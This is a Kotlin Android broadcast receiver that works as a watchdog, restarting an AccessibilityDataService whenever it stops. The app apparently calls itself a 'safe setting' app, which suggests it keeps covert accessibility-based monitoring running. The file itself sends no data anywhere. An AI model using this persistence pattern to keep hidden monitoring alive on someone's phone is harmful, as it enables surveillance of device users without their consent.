package com.safe.setting.app.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.safe.setting.app.services.accessibilityData.AccessibilityDataService
import com.safe.setting.app.utils.Consts.TAG

class RestartServiceReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (context != null) {
            if (!AccessibilityDataService.isRunningService) {
                Log.e(TAG, "Watchdog detected service is down. Restarting AccessibilityDataService...")
                val serviceIntent = Intent(context, AccessibilityDataService::class.java)

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }
            } else {
                Log.d(TAG, "Watchdog checked: Service is already running.")
            }
        }
    }
}